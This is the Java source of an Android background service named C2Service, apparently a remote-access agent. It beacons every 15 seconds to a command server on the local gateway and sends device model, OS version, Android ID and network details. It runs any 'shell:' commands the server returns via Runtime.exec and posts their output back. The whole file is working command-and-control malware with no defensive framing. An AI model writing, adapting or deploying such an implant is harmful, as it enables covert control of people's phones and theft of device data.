package com.c2.agent;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.DhcpInfo;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class C2Service extends Service {
    private static final String TAG = "C2Agent";
    private static String C2_BEACON;
    private static String C2_RESULTS;
    private static final long BEACON_INTERVAL = 15;
    private static boolean running = false;
    private ScheduledExecutorService scheduler;

    public static boolean isRunning() { return running; }

    private String detectGateway() {
        try {
            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifi != null) {
                DhcpInfo dhcp = wifi.getDhcpInfo();
                if (dhcp != null && dhcp.gateway != 0) {
                    int ip = dhcp.gateway;
                    String gw = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
                    if (!gw.equals("0.0.0.0")) return gw;
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "WiFi gateway detection failed: " + e.getMessage());
        }
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo ni = cm.getActiveNetworkInfo();
            if (ni != null && ni.getType() == ConnectivityManager.TYPE_WIFI) return null;
        } catch (Exception e) {}
        return "10.0.2.2";
    }

    @Override
    public void onCreate() {
        super.onCreate();
        String gateway = detectGateway();
        if (gateway == null) gateway = "10.0.2.2";
        C2_BEACON = "http://" + gateway + ":80/beacon.php";
        C2_RESULTS = "http://" + gateway + ":80/results.php";
        running = true;
        Log.d(TAG, "C2 Gateway: " + gateway + " | Beacon: " + C2_BEACON);
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::beacon, 2, BEACON_INTERVAL, TimeUnit.SECONDS);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public void onDestroy() {
        running = false;
        if (scheduler != null && !scheduler.isShutdown()) scheduler.shutdown();
        super.onDestroy();
    }

    private void beacon() {
        try {
            String data = collectDeviceInfo();
            String response = httpPost(C2_BEACON, data);
            if (response != null && response.contains("commands")) {
                int start = response.indexOf("shell:");
                while (start != -1) {
                    int end = response.indexOf("\"", start + 6);
                    if (end == -1) break;
                    executeCommand(response.substring(start, end));
                    start = response.indexOf("shell:", end);
                }
            }
        } catch (Exception e) { Log.e(TAG, "Beacon: " + e.getMessage()); }
    }

    private String collectDeviceInfo() {
        StringBuilder sb = new StringBuilder();
        sb.append("device=").append(urlEncode(Build.DEVICE));
        sb.append("&model=").append(urlEncode(Build.MODEL));
        sb.append("&brand=").append(urlEncode(Build.BRAND));
        sb.append("&release=").append(urlEncode(Build.VERSION.RELEASE));
        sb.append("&sdk=").append(Build.VERSION.SDK_INT);
        sb.append("&id=").append(urlEncode(Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)));
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        sb.append("&network=").append(urlEncode(ni != null && ni.isConnected() ? ni.getTypeName() : "NONE"));
        try {
            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifi != null && wifi.getDhcpInfo() != null) {
                int gw = wifi.getDhcpInfo().gateway;
                String g = (gw & 0xFF) + "." + ((gw >> 8) & 0xFF) + "." + ((gw >> 16) & 0xFF) + "." + ((gw >> 24) & 0xFF);
                sb.append("&gateway=").append(urlEncode(g));
            }
        } catch (Exception e) {}
        return sb.toString();
    }

    private void executeCommand(String cmd) {
        try {
            String output = cmd.startsWith("shell:") ? runShellCommand(cmd.substring(6)) : ("Unknown: " + cmd);
            httpPost(C2_RESULTS, "id=" + urlEncode(Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)) + "&output=" + urlEncode(output));
        } catch (Exception e) { Log.e(TAG, "Exec: " + e.getMessage()); }
    }

    private String runShellCommand(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder out = new StringBuilder(); String line;
            while ((line = r.readLine()) != null) out.append(line).append("\n");
            p.waitFor(); return out.toString().trim();
        } catch (Exception e) { return "ERROR: " + e.getMessage(); }
    }

    private String httpPost(String urlStr, String data) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setDoOutput(true);
        conn.setConnectTimeout(8000); conn.setReadTimeout(8000);
        OutputStream os = conn.getOutputStream();
        os.write(data.getBytes("UTF-8")); os.flush(); os.close();
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder(); String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        reader.close(); return sb.toString();
    }

    private String urlEncode(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; }
    }
}
